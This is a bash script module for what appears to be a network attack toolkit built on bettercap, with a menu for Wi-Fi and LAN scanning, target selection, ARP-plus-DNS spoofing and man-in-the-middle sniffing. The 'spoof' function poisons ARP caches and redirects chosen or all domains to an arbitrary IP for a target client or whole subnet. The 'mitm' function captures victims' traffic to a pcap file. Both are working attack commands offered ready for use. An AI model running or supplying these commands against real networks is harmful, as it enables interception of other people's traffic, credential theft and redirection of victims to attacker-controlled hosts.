#!/bin/bash

scan () {
	while true; do
        warn "Don't press Ctrl + C here"
        read -rp "$(printf "%s Scanning Time... %s\t" "${BLUE_DIM}" "${NC}")" sec	
        if [[ -z $sec || $sec -ge 60  || ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
    		warn "Scan time must be a number greater than 0 and less then 61 sec"
		    enter
	    else 
            break
        fi
    done
	
	sudo bettercap -iface "$INTER" -eval "wifi.recon on; net.recon on; net.probe on; sleep $sec; net.show; wifi.show; exit" 2>/dev/null | tee bettercap_scan.txt
}

select_network() {
	if [[ ! -f bettercap_scan.txt ]]; then 
        err "File bettercap_scan.txt couldn't be generated, please retry"
        enter
        return 1
    fi
    info "Scan Finished"
	python3 "$SCRIPT_DIR/modules/parse_scan.py" bettercap_scan.txt > /tmp/scan_results.txt
	scan_check

	if [[ "$(wc -l < /tmp/scan_results.txt)" = 0 ]]; then 
        err "Proper scan not done or pressed ctrl+c in the small terminal"
        enter
        return 1
    fi

    while true; do
    	read -rp "$(printf "%s%s Select target (1-$(wc -l < /tmp/scan_results.txt)) (For [Scan Again] chose 0): %s" "${PURPLE}" "${BOLD}" "${NC}")" PICK #(wc -l < /tmp/scan_results.txt)this part tell the output terminal how many bssid are available

	if [[ -n $PICK && $PICK =~ ^[0-9]+$ && $PICK -gt 0 && $PICK -le $(wc -l < /tmp/scan_results.txt) ]]; then
		info "Nothing Picked $PICK"
        break
	else
		err "Please choose between 1 to $(wc -l < /tmp/scan_results.txt) only"
		read -rp "$(printf "%sPress [Enter] key to continue...%s" "${GREEN_DIM}" "${NC}")"
	fi
	done
	IFS=',' read -r ap ch <<< "$(python3 "$SCRIPT_DIR/modules/pick_ap.py" /tmp/scan_results.txt "$PICK")"
	
    info "GATEWAY: $GATEWAY"

    read -rp "$(ask "${BOLD}Is the autoslected data correct (Yes/No)")" choice

    choice=$(echo "$choice" | tr '[:upper:]' '[:lower:]' | tr -d ' ')
    if [[ $choice = no ]];then
        while true; do
            read -rp "$(printf "%sSelect the AP MAC%s\t" "${BLUE_DIM}" "${NC}")" ap
            if [[ $ap =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                break
            else
                err "Invalid MAC — expected format AA:BB:CC:DD:EE:FF"
            fi
        done

        while true; do
            read -rp "$(printf "%sSelect the Channel of the AP%s\t" "${BLUE_DIM}" "${NC}")" ch
            if [[ $ch =~ ^[0-9]+$ ]] && (( ch >= 1 && ch <= 165 )); then
                break
            else
                err "Invalid channel — enter a number between 1 and 165"
            fi
        done
    fi

    if [[ -z $ap && -z $ch && -z $GATEWAY ]]; then
        err "AP or Channel or Gateway Selection Failed"
		return 1
    fi
       rm /tmp/scan_results.txt 2>/dev/null 
        enter
}

spoof () {
	
	read -rp "$(info "Domain to spoof or ${RED}[All]: ")" DOMA
    if [[ -n $DOMA ]]; then
        if [[ ! $DOMA =~ ^[A-Za-z0-9.*-]+$ ]]; then
            err "Invalid domain — letters, digits, dots, dashes and * only"
            return 1
        fi
        DOMAIN="$DOMA"
    else
        DOMAIN="*"
    fi
    info "Domain set to: $DOMAIN"
    
    read -rp "$(info "Location where to spoof or ${RED}Default[Google]: ")" FAKE_IP
    if [[ -n $FAKE_IP ]]; then
        if [[ ! $FAKE_IP =~ ^(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$ ]]; then
            err "Invalid IP — expected format like 8.8.8.8"
            return 1
        fi
        FAKE="$FAKE_IP"
    else
        FAKE="8.8.8.8"
    fi
    info "Spoofing set to: $FAKE"
    
    read -rp "$(info "Target Client IP or All[ENTER]: ")" TARGET_IP
    if [[ -n $TARGET_IP ]]; then
        if [[ ! $TARGET_IP =~ ^(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(/[0-9]{1,2})?$ ]]; then
            err "Invalid target IP/CIDR"
            return 1
        fi
		TARGET="$TARGET_IP"
	else
		if [[ -z $SUBNET ]]; then
			err "No subnet detected — enter a target IP instead"
			return 1
		fi
		TARGET="$SUBNET"
    fi
    
    read -rp "$(printf "%sSpoofing Time... %s\t" "${BLUE_DIM}" "${NC}")" sec
    if [[ ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
        err "Spoofing time must be a positive number"
        return 1
    fi
    
    sudo bettercap -iface "$INTER" -eval "
        set arp.spoof.targets $TARGET;
        arp.spoof on;
        set dns.spoof.domains $DOMAIN;
        set dns.spoof.address $FAKE;
        dns.spoof on;
        sleep $sec;
        exit; "
}

mitm () {
     read -rp "$(info "Target Client IP or All[ENTER]: ")" TARGET_IP
    if [[ -n $TARGET_IP ]]; then
        if [[ ! $TARGET_IP =~ ^(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(/[0-9]{1,2})?$ ]]; then
            err "Invalid target IP/CIDR"
            return 1
        fi
		TARGET="$TARGET_IP"
	else
		if [[ -z $SUBNET ]]; then
			err "No subnet detected — enter a target IP instead"
			return 1
		fi
		TARGET="$SUBNET"
    fi
    
    read -rp "$(printf "%sSniff Time... %s\t" "${BLUE_DIM}" "${NC}")" sec
    if [[ ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
        err "Sniff time must be a positive number"
        return 1
    fi

    sudo bettercap -iface "$INTER" -eval "
        set arp.spoof.targets $TARGET;
        arp.spoof on;
        set net.sniff.verbose true;
        set net.sniff.output /tmp/sniff_$(date +%F_%T).pcap;
        net.sniff on;
        sleep $sec;
        exit
    "
}
bettercap_menu () {

		clear
		while true; do 
		status_banner
		print_bettercap
		info "-----Choose Menu-----"
			rel "1) Scan"
			rel "2) Select Network (Wait 5sec After Scan)"
			rel "3) DNS+ARP Spoof"
			rel "4) MITM"
			if [[ -n $ip || -n $GATEWAY || -n $SUBNET ]]; then
				info "	Option (55 and 28) is visible bcz either IP GATEWAY SUBNET variables are non-empty "
				relnext "	55) Network Nmap (Sub IP range would be better)"
				relnext "	28) Other Nmap"
			fi
			buck "0) Main Menu"
			
		userask
		
			case $choice in 
				
				1)scan;;
				
				2)select_network;;
				
				3)spoof;;
				
				4)mitm;;

				55)network ;;
				
				28) other ;;
				
				0) break;;
				
				*) err "Wrong Choice [ENTER]"
					read -rp ">>"
					continue ;;			
			esac
		done
}
